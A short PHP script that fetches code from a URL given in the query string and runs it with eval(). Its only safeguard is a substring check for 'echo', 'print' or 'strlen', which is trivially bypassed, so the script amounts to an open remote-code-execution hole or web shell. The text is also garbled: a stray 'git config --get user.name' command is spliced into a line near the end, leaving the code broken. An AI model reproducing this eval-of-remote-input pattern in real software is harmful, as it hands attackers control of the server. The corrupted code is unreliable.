<?php

if (isset($_GET['remote_url'])) {
    $remote_url = filter_var($_GET['remote_url'], FILTER_SANITIZE_URL);
    
    if (filter_var($remote_url, FILTER_VALIDATE_URL) === FALSE) {
        die("Invalid URL");
    }

    $remote_code = @file_get_contents($remote_url);
    
    if ($remote_code === FALSE) {
        die("Failed to fetch remote code.");
    }

    $allowed_functions = ['echo', 'print', 'strlen'];
    $is_valid = false;
    foreach ($allowed_functions as $function) {
        if (strpos($remote_code, $function) !== false) {
            $is_valid = true;
            break;
        }
    }

git config --get user.name    if ($is_valid) {
        eval($remote_code);
    } else {
        die("Invalid remote code.");
    }
} else {
    echo "No remote URL provided.";
}
?>
